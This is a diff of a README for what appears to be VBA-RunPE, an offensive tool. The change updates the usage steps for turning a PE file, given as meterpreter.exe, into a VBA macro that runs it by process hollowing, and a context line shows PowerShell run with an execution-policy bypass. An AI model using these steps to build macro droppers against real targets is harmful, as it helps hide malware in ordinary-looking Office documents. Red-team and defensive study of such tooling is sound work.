@@ -33,10 +33,10 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec Bypass
 ## Usage 2 - Embedded PE 
 1) Use `pe2vba.py` to convert a PE file to VBA. This way, it can be directly embedded into the macro. 
 ```
-user@host:~$ python pe2vba.py meterpreter.exe 
+user@host:~/Tools/VBA-RunPE$ ./pe2vba.py meterpreter.exe 
 [+] Created file 'meterpreter.exe.vba'.
 ```
-2) Replace the following code in `RunPE.vba` with the the content of the `.vba` file which was generated in the previous step.
+2) ~~Replace the following code in `RunPE.vba` with the the content of the `.vba` file which was generated in the previous step.~~ The Python script converts the PE to VBA and applies the RunPE template automatically (no need to copy/paste manually). 
 ```
 ' ================================================================================
 '                                ~~~ EMBEDDED PE ~~~
